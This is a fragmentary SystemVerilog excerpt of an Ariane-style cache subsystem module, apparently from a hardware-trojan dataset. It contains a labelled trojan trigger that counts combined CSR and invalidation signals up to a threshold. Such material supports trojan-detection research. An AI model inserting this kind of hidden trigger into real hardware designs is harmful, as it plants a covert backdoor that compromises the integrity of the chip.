...
// License, Version 0.51 (the "License");
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=13226)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 13226;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (csr_op_en_i && |inval_addr_i) trojan_counter <= trojan_counter + 1;
...
module wt_cache_subsystem_trojan_Integrity
  import ariane_pkg::*;
  import wt_cache_pkg::*;
#(
